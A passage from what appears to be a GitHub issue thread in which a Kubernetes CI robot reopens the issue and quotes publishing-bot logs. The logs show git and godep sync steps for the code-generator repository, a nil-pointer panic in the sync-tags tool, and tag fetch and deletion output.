Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\tGodeps.json hasn't changed!\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>\tRemove redundant godep commits on-top of aae79feb89bdded3679da91fd8c19b6dfcbdb79a.\n>\t+ echo 'Remove redundant godep commits on-top of aae79feb89bdded3679da91fd8c19b6dfcbdb79a.'\n>\t+ git reset --soft -q aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ local repo=code-generator\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master\n>\t+ '[' -n 'aae79fe Merge pull request #67655 from sttts/sttts-apiextensions-apiserver-codegen-script' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master'\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-code-generator-master.sh --dependencies '' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\tpanic: runtime error: invalid memory address or nil pointer dereference\n>\t[signal SIGSEGV: segmentation violation code=0x1 addr=0x71 pc=0x72f76a]\n>\n>\tgoroutine 1 [running]:\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:164 +0xf7a\n>[09 Sep 18 21:02 UTC]: exit status 2\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=code-generator\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/code-generator\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=false\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=64d3282ec646f1f850f37c03336d73d1e836f226\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q a4df698a96cf14cb8783233b5b95635e2edf002e\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=a4df698a96cf14cb8783233b5b95635e2edf002e\n>    \t+ '[' a4df698a96cf14cb8783233b5b95635e2edf002e '!=' 64d3282ec646f1f850f37c03336d73d1e836f226 ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''64d3282ec646f1f850f37c03336d73d1e836f226'\\'' to '\\''a4df698a96cf14cb8783233b5b95635e2edf002e'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator master master '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/code-generator\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 15 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit aae79feb89bdded3679da91fd8c19b6dfcbdb79a.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit a4df698a96cf14cb8783233b5b95635e2edf002e.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B master\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ true\n>    \t+ local k_base_commit=b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>    \t+ '[' -z b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb ']'\n>    \t++ git-find-merge b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb upstream/master\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 'b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb^1..upstream/master' --first-parent\n>    \t+++ git rev-list b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb..upstream/master --ancestry-path\n>    \t+++ git rev-parse b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>    \t+ local k_base_merge=b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>    \t+ '[' -z b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb ']'\n>    \t+ git branch -f filtered-branch-base b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>    \t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/code-generator\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=0aecd14c539d69150c5c4b198ea78c7993e17a37\n>    \t++ git log --first-parent --format=%H --reverse 0aecd14c539d69150c5c4b198ea78c7993e17a37..HEAD\n>    \t+ f_mainline_commits=\n>    \t+ echo 'Checking out branch master.'\n>    \t+ git checkout -q master\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' aae79feb89bdded3679da91fd8c19b6dfcbdb79a '!=' aae79feb89bdded3679da91fd8c19b6dfcbdb79a ']'\n>    \t+ '[' false = true ']'\n>    \t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>    \t+ local deps=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/code-generator\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ git log --format=%B HEAD\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_last_kube_commit=b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>    \t+ '[' -z b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb ']'\n>    \t++ git-find-merge b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb upstream-branch\n>    \t++ tail -1\n>    \t+++ git rev-list 'b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb^1..upstream-branch' --first-parent\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb..upstream-branch --ancestry-path\n>    \t+++ git rev-parse b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>    \t+ local k_last_kube_merge=b5ae4498bc7df2d9a9f8a17e8803b3524ea09ffb\n>    \t+ local dep_count=0\n>    \t+ (( i=0 ))\n>    \t+ (( i<0 ))\n>    \t+ rm -rf ./Godeps\n>    \t+ rm -rf ./vendor\n>    \t+ echo 'Running godep save.'\n>    \t+ godep save ./...\n>    \t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>    \t+ git checkout HEAD Godeps/\n>    \t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>    \t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ '[' false = true ']'\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git clean -f Godeps\n>    \t+ git add vendor/ --ignore-errors\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>    \t+ echo 'Remove redundant godep commits on-top of aae79feb89bdded3679da91fd8c19b6dfcbdb79a.'\n>    \t+ git reset --soft -q aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ basename /go-workspace/src/k8s.io/code-generator\n>    \t+ local repo=code-generator\n>    \t++ git log --oneline --first-parent --merges\n>    \t++ head -n 1\n>    \t+ '[' -n 'aae79fe Merge pull request #67655 from sttts/sttts-apiextensions-apiserver-codegen-script' ']'\n>    \t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master'\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ LAST_BRANCH=master\n>    \t++ git rev-parse HEAD\n>    \t+ LAST_HEAD=aae79feb89bdded3679da91fd8c19b6dfcbdb79a\n>    \t+ EXTRA_ARGS=()\n>    \t+ PUSH_SCRIPT=../push-tags-code-generator-master.sh\n>    \t+ echo '#!/bin/bash'\n>    \t+ chmod +x ../push-tags-code-generator-master.sh\n>    \t+ '[' -z '' ']'\n>    \t++ echo kubernetes\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-code-generator-master.sh --dependencies '' -alsologtostderr ''\n>    \tpanic: runtime error: invalid memory address or nil pointer dereference\n>    \t[signal SIGSEGV: segmentation violation code=0x1 addr=0x71 pc=0x72f76a]\n>\n>    \tgoroutine 1 [running]:\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:164 +0xf7a\n>\n>[09 Sep 18 21:02 UTC]: exit status 2```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopening this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-420317236):\n\n>/reopen\n>\n>The last publishing run failed: exit status 1\n>```\n>...0-beta.0\n>\t * [new tag]         kubernetes-1.8.11 -> origin/kubernetes-1.8.11\n>\t * [new tag]         kubernetes-1.8.11-beta.0 -> origin/kubernetes-1.8.11-beta.0\n>\t * [new tag]         kubernetes-1.8.12 -> origin/kubernetes-1.8.12\n>\t * [new tag]         kubernetes-1.8.12-beta.0 -> origin/kubernetes-1.8.12-beta.0\n>\t * [new tag]         kubernetes-1.8.13 -> origin/kubernetes-1.8.13\n>\t * [new tag]         kubernetes-1.8.13-beta.0 -> origin/kubernetes-1.8.13-beta.0\n>\t * [new tag]         kubernetes-1.8.14 -> origin/kubernetes-1.8.14\n>\t * [new tag]         kubernetes-1.8.14-beta.0 -> origin/kubernetes-1.8.14-beta.0\n>\t * [new tag]         kubernetes-1.8.15 -> origin/kubernetes-1.8.15\n>\t * [new tag]         kubernetes-1.8.15-beta.0 -> origin/kubernetes-1.8.15-beta.0\n>\t * [new tag]         kubernetes-1.8.16-beta.0 -> origin/kubernetes-1.8.16-beta.0\n>\t * [new tag]         kubernetes-1.8.2 -> origin/kubernetes-1.8.2\n>\t * [new tag]         kubernetes-1.8.2-beta.0 -> origin/kubernetes-1.8.2-beta.0\n>\t * [new tag]         kubernetes-1.8.3 -> origin/kubernetes-1.8.3\n>\t * [new tag]         kubernetes-1.8.3-beta.0 -> origin/kubernetes-1.8.3-beta.0\n>\t * [new tag]         kubernetes-1.8.4 -> origin/kubernetes-1.8.4\n>\t * [new tag]         kubernetes-1.8.4-beta.0 -> origin/kubernetes-1.8.4-beta.0\n>\t * [new tag]         kubernetes-1.8.5 -> origin/kubernetes-1.8.5\n>\t * [new tag]         kubernetes-1.8.5-beta.0 -> origin/kubernetes-1.8.5-beta.0\n>\t * [new tag]         kubernetes-1.8.6 -> origin/kubernetes-1.8.6\n>\t * [new tag]         kubernetes-1.8.6-beta.0 -> origin/kubernetes-1.8.6-beta.0\n>\t * [new tag]         kubernetes-1.8.7 -> origin/kubernetes-1.8.7\n>\t * [new tag]         kubernetes-1.8.7-beta.0 -> origin/kubernetes-1.8.7-beta.0\n>\t * [new tag]         kubernetes-1.8.8 -> origin/kubernetes-1.8.8\n>\t * [new tag]         kubernetes-1.8.8-beta.0 -> origin/kubernetes-1.8.8-beta.0\n>\t * [new tag]         kubernetes-1.8.9 -> origin/kubernetes-1.8.9\n>\t * [new tag]         kubernetes-1.8.9-beta.0 -> origin/kubernetes-1.8.9-beta.0\n>\t * [new tag]         kubernetes-1.9.0 -> origin/kubernetes-1.9.0\n>\t * [new tag]         kubernetes-1.9.0-alpha.0 -> origin/kubernetes-1.9.0-alpha.0\n>\t * [new tag]         kubernetes-1.9.0-alpha.1 -> origin/kubernetes-1.9.0-alpha.1\n>\t * [new tag]         kubernetes-1.9.0-alpha.2 -> origin/kubernetes-1.9.0-alpha.2\n>\t * [new tag]         kubernetes-1.9.0-alpha.3 -> origin/kubernetes-1.9.0-alpha.3\n>\t * [new tag]         kubernetes-1.9.0-beta.0 -> origin/kubernetes-1.9.0-beta.0\n>\t * [new tag]         kubernetes-1.9.0-beta.1 -> origin/kubernetes-1.9.0-beta.1\n>\t * [new tag]         kubernetes-1.9.0-beta.2 -> origin/kubernetes-1.9.0-beta.2\n>\t * [new tag]         kubernetes-1.9.1 -> origin/kubernetes-1.9.1\n>\t * [new tag]         kubernetes-1.9.1-beta.0 -> origin/kubernetes-1.9.1-beta.0\n>\t * [new tag]         kubernetes-1.9.10 -> origin/kubernetes-1.9.10\n>\t * [new tag]         kubernetes-1.9.10-beta.0 -> origin/kubernetes-1.9.10-beta.0\n>\t * [new tag]         kubernetes-1.9.11-beta.0 -> origin/kubernetes-1.9.11-beta.0\n>\t * [new tag]         kubernetes-1.9.2 -> origin/kubernetes-1.9.2\n>\t * [new tag]         kubernetes-1.9.2-beta.0 -> origin/kubernetes-1.9.2-beta.0\n>\t * [new tag]         kubernetes-1.9.3 -> origin/kubernetes-1.9.3\n>\t * [new tag]         kubernetes-1.9.3-beta.0 -> origin/kubernetes-1.9.3-beta.0\n>\t * [new tag]         kubernetes-1.9.4 -> origin/kubernetes-1.9.4\n>\t * [new tag]         kubernetes-1.9.4-beta.0 -> origin/kubernetes-1.9.4-beta.0\n>\t * [new tag]         kubernetes-1.9.5 -> origin/kubernetes-1.9.5\n>\t * [new tag]         kubernetes-1.9.5-beta.0 -> origin/kubernetes-1.9.5-beta.0\n>\t * [new tag]         kubernetes-1.9.6 -> origin/kubernetes-1.9.6\n>\t * [new tag]         kubernetes-1.9.6-beta.0 -> origin/kubernetes-1.9.6-beta.0\n>\t * [new tag]         kubernetes-1.9.7 -> origin/kubernetes-1.9.7\n>\t * [new tag]         kubernetes-1.9.7-beta.0 -> origin/kubernetes-1.9.7-beta.0\n>\t * [new tag]         kubernetes-1.9.8 -> origin/kubernetes-1.9.8\n>\t * [new tag]         kubernetes-1.9.8-beta.0 -> origin/kubernetes-1.9.8-beta.0\n>\t * [new tag]         kubernetes-1.9.9 -> origin/kubernetes-1.9.9\n>\t * [new tag]         kubernetes-1.9.9-beta.0 -> origin/kubernetes-1.9.9-beta.0\n>\tDeleting tag v1.7.12-beta.0 because kFirstParentCommits lacks target \"15ea8ac863f13cf2a3496cd056b3d5a763a25c34\"\n>\tDeleting tag v0.17.1 because kFirstParentCommits lacks target \"7565d411c4157dec70c6c43c47b0e4daef07524b\"\n>\tDeleting tag v1.11.4-beta.0 because kFirstParentCommits lacks target \"d63fc3a01ef5148aff8a9ac5f1af66c93894a2a6\"\n>\tDeleting tag v1.5.0-beta.2 because kFirstParentCommits lacks target \"0776eab45fe28f02bbeac0f05ae1a203051a21eb\"\n>\tDeleting tag v1.8.10-beta.0 because kFirstParentCommits lacks target \"bde6c18fee950ac8b40320e2106b38f5cf70370f\"\n>\tDeleting tag v1.3.7 because kFirstParentCommits lacks target \"a2cba278cba1f6881bb0a7704d9cac6fca6ed435\"\n>\tDeleting tag v1.3.0-beta.3 because kFirstParentCommits lacks target \"a303f87b3366bc89b96c88b5d6d9edd3eda418e7\"\n>\tDeleting tag v1.1.4 because kFirstParentCommits lacks target \"a5949fea3a91d6a50f40a5684e05879080a4c61d\"\n>\tDeleting tag v1.1.4-beta.0 because kFirstParentCommits lacks target \"8dec957e4bba8b1260995d525a8260e03acbc181\"\n>\tDeleting tag v1.11.0 because kFirstParentCommits lacks target \"91e7b4fd31fcd3d5f436da26c980becec37ceefe\"\n>\tDeleting tag v1.2.1 because kFirstParentCommits lacks target \"50809107cd47a1f62da362bccefdd9e6f7076145\"\n>\tDeleting tag v1.7.6 because kFirstParentCommits lacks target \"4bc5e7f9a6c25dc4c03d4d656f2cefd21540e28c\"\n>\tDeleting tag v1.8.14 because kFirstParentCommits lacks target \"9d72fafc46543ebdad024b7577012268bab543a7\"\n>\tDeleting tag v0.12.0 because kFirstParentCommits lacks target \"ecca42643b91a7117de8cd385b64e6bafecefd65\"\n>\tDeleting tag v0.9.1 because kFirstParentCommits lacks target \"3623a01bf0e90de6345147eef62894057fe04b29\"\n>\tDeleting tag v1.0.7 because kFirstParentCommits lacks target \"6234d6a0abd3323cd08c52602e4a91e47fc9491c\"\n>\tDeleting tag v1.10.0-alpha.3 because kFirstParentCommits lacks target \"89cbdc0d6ff54dff025113c6c8f15b95abcd721c\"\n>\tDeleting tag v0.21.2 because kFirstParentCommits lacks target \"4e89f2e6670b1662021a86ac42b99c5c50c37d05\"\n>\tDeleting tag v0.5.5 because kFirstParentCommits lacks target \"4cb55b015bf1f42a9da25dbf4c3f4a60a1959574\"\n>\tDeleting tag v1.3.9 because kFirstParentCommits lacks target \"ee10669e21109f86c21e8f7ceb1187d7910fe120\"\n>\tDeleting tag v1.6.3-beta.0 because kFirstParentCommits lacks target \"a5dec22fe9062288a6c79ef77cc5cfdd0f9c7a89\"\n>\tDeleting tag v1.8.11-beta.0 because kFirstParentCommits lacks target \"8c5b6bee50b4f107f053b3e4ad3f0a8b705bfcd0\"\n>\tDeleting tag v0.18.0 because kFirstParentCommits lacks target \"754d3ce99ee50f392369868bf6ba1e866801b086\"\n>\tDeleting tag v1.13.0-alpha.0 because kFirstParentCommits lacks target \"d0439d417b0563d44c65b6e400e2070964dea7d1\"\n>\tDeleting tag v1.7.0-beta.3 because kFirstParentCommits lacks target \"594edb773975124b137fa12bc573478a0355e89c\"\n>\tDeleting tag v1.8.15 because kFirstParentCommits lacks target \"c2bd642c70b3629223ea3b7db566a267a1e2d0df\"\n>\tDeleting tag v1.1.1-beta.0 because kFirstParentCommits lacks target \"7d6c8b640f2e90cf2347fb46ef4cf46cd3280015\"\n>\tDeleting tag v1.3.3 because kFirstParentCommits lacks target \"c6411395e09da356c608896d3d9725acab821418\"\n>\tDeleting tag v1.4.0-beta.7 because kFirstParentCommits lacks target 